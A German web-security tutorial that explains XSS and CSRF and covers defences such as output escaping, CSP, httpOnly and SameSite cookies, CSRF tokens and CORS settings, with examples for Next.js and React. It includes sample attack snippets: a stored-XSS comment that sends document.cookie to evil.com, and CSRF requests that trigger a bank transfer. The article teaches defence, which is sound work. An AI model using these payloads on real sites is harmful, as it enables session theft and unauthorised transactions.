---
title: "CSRF und XSS: Angriffe verstehen und abwehren"
description: "CSRF und XSS-Angriffe verständlich erklärt: Wie Cross-Site Request Forgery und Cross-Site Scripting funktionieren und wie du deine Web-App dagegen schützt."
category: "Authentifizierung & Sicherheit"
order: 35
keywords: ["CSRF", "XSS", "Cross-Site Scripting", "Web-Sicherheit", "OWASP"]
---

## Warum diese Angriffe so gefährlich sind

CSRF und XSS stehen seit Jahren in der OWASP Top 10 der häufigsten Sicherheitslücken. Beide ermöglichen Angreifern, **im Namen echter Nutzer** Aktionen durchzuführen — ohne das Passwort zu kennen.

---

## XSS — Cross-Site Scripting

### Was ist XSS?

Bei einem XSS-Angriff gelingt es einem Angreifer, **JavaScript-Code in deine Website einzuschleusen**, der dann im Browser anderer Nutzer ausgeführt wird.

### Reflected XSS — einfaches Beispiel

```html
<!-- Deine Suche: "Was ist <script>alert('XSS!')</script>" -->
<h1>Suchergebnisse für: Was ist <script>alert('XSS!')</script></h1>
<!-- Das Script wird ausgeführt! -->
```

Wenn du Nutzereingaben ungefiltert ins HTML einfügst, kann ein Angreifer JavaScript einschleusen.

### Stored XSS — gefährlicher

```
1. Angreifer postet Kommentar:
   "Toller Artikel! <script>
     fetch('https://evil.com/steal?cookie=' + document.cookie)
   </script>"

2. Deine App speichert das unfiltered in der DB

3. Jeder Nutzer, der den Kommentar liest,
   sendet seinen Cookie zum Angreifer!
```

### XSS verhindern

**Regel 1: Output immer escapen**

```typescript
// ❌ Gefährlich — direkte HTML-Einfügung
element.innerHTML = userInput;

// ✓ Sicher — Text-Einfügung
element.textContent = userInput;

// ✓ Sicher in React — JSX escaped automatisch
return <div>{userInput}</div>;  // <script> wird als Text gerendert

// ⚠️ Gefährlich in React — nur für vertrauenswürdige Inhalte!
return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
```

**Regel 2: Content Security Policy (CSP)**

```typescript
// next.config.ts
const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: [
      "default-src 'self'",
      "script-src 'self' 'nonce-{NONCE}'",  // Nur eigene Scripts + nonce
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: https:",
      "connect-src 'self' https://api.supabase.co",
    ].join('; ')
  },
];
```

CSP verhindert, dass externe Scripts ausgeführt werden — selbst wenn ein Angreifer Code einschleust.

**Regel 3: httpOnly Cookies**

```typescript
// httpOnly-Cookie kann JavaScript nicht lesen!
res.setHeader('Set-Cookie', 'session=abc123; HttpOnly; Secure; SameSite=Strict');
```

Selbst wenn XSS gelingt, kommt der Angreifer nicht an httpOnly-Cookies ran.

> [!IMPORTANT]
> React escapet JSX-Ausdrücke automatisch. Das ist einer der wichtigsten Sicherheitsvorteile von React — aber `dangerouslySetInnerHTML` hebelt das aus. Benutze es nur für vertrauenswürdige Inhalte (z. B. von dir selbst geschriebenes Markdown).

---

## CSRF — Cross-Site Request Forgery

### Was ist CSRF?

Bei CSRF bringt ein Angreifer einen eingeloggten Nutzer dazu, **unbeabsichtigt eine Anfrage an deine App** zu senden.

### Klassisches CSRF-Beispiel

```html
<!-- evil.com sendet heimlich eine Anfrage an deine Bank -->
<img src="https://deine-bank.de/transfer?amount=1000&to=angreifer" />
```

Der Browser schickt automatisch alle Cookies mit — deine Bank denkt, du hast die Überweisung autorisiert.

### Wie CSRF funktioniert

```
1. Nutzer ist bei bank.de eingeloggt (Session-Cookie gesetzt)
2. Nutzer besucht evil.com
3. evil.com führt aus:
   fetch('https://bank.de/api/transfer', {
     method: 'POST',
     body: JSON.stringify({ to: 'hacker', amount: 1000 }),
     credentials: 'include'  // Cookies werden mitgeschickt!
   });
4. Bank.de empfängt Anfrage mit gültigem Session-Cookie
5. Überweisung wird ausgeführt!
```

### CSRF verhindern

**Methode 1: SameSite Cookies (beste Lösung)**

```typescript
// SameSite=Strict: Cookie wird NUR bei Anfragen von derselben Domain gesendet
Set-Cookie: session=abc; SameSite=Strict; Secure; HttpOnly

// SameSite=Lax: Cookie bei normaler Navigation, nicht bei POST-Requests von anderen Domains
Set-Cookie: session=abc; SameSite=Lax; Secure; HttpOnly
```

Mit `SameSite=Strict` oder `SameSite=Lax` wird der Session-Cookie nicht von evil.com mitgeschickt — CSRF ist geblockt.

**Methode 2: CSRF-Token**

```typescript
// Server generiert Token beim Seitenaufruf
const csrfToken = crypto.randomBytes(32).toString('hex');
req.session.csrfToken = csrfToken;

// Token wird im HTML eingebettet
<form>
  <input type="hidden" name="_csrf" value={csrfToken} />
  ...
</form>

// Server prüft Token bei POST-Anfragen
app.post('/transfer', (req, res) => {
  if (req.body._csrf !== req.session.csrfToken) {
    return res.status(403).json({ error: 'Ungültiger CSRF-Token' });
  }
  // ...
});
```

**Methode 3: Custom Request Header**

```typescript
// Browser von anderen Domains kann keine Custom Headers senden (CORS)
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-Requested-With': 'XMLHttpRequest',  // Custom Header
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({ amount: 100 }),
});

// Server prüft Header
if (!req.headers['x-requested-with']) {
  return res.status(403).json({ error: 'Ungültige Anfrage' });
}
```

---

## CORS — der verwandte Begriff

**CORS** (Cross-Origin Resource Sharing) ist kein Angriff, sondern eine Sicherheitsmechanismus des Browsers, der regelt, welche Domains auf deine API zugreifen dürfen.

```typescript
// next.config.ts — CORS für API-Routes konfigurieren
export const GET = async (req: Request) => {
  const response = new Response(JSON.stringify(data));

  // Nur diese Origins erlauben
  response.headers.set('Access-Control-Allow-Origin', 'https://deine-domain.de');
  response.headers.set('Access-Control-Allow-Methods', 'GET, POST');
  response.headers.set('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  return response;
};
```

---

## Sicherheits-Checkliste

```
XSS-Schutz:
☐ Keine ungefilterten User-Inputs ins HTML
☐ React/Vue/Angular nutzen (auto-escaping)
☐ CSP-Headers gesetzt
☐ httpOnly + Secure Cookies
☐ dangerouslySetInnerHTML vermeiden

CSRF-Schutz:
☐ SameSite=Strict/Lax für Session-Cookies
☐ CSRF-Token für Formulare (falls SameSite nicht reicht)
☐ Custom Request Header für AJAX-Anfragen

Allgemein:
☐ HTTPS erzwungen
☐ Security Headers gesetzt (X-Frame-Options, etc.)
☐ Dependency-Updates regelmäßig (npm audit)
```

> [!NOTE]
> Next.js setzt viele Security-Headers automatisch. Du kannst sie mit `next.config.ts` ergänzen und anpassen. `next-safe` ist eine praktische Library, die empfohlene Security-Headers vorkonfiguriert.

---

## Wie Venator dir hilft

Venator erklärt bei jeder empfohlenen Auth-Strategie automatisch, welche Sicherheitsmaßnahmen du implementieren musst. Du bekommst eine Checkliste für dein spezifisches Setup — ob Supabase Auth, NextAuth oder eigene JWT-Implementierung.

## Weiterführende Artikel

- [JWT vs Sessions: Was ist besser?](/learn/jwt-vs-sessions)
- [API-Keys sicher verwalten](/learn/api-keys-verwalten)
- [Sicherheitsgrundlagen für Web-Apps](/learn/security-basics)
